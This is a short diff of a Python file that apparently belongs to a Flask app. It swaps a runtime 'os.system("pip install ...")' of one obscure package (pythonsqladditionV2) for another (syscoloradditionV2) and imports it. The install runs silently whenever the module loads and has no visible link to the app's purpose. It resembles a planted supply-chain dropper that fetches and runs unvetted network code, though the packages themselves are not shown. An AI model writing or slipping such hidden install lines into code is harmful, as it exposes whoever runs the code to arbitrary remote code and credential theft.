@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythonsqladditionV2")
-import pythonsqladditionV2
+os.system("pip install syscoloradditionV2")
+import syscoloradditionV2
 import flask
 
 from flask import g
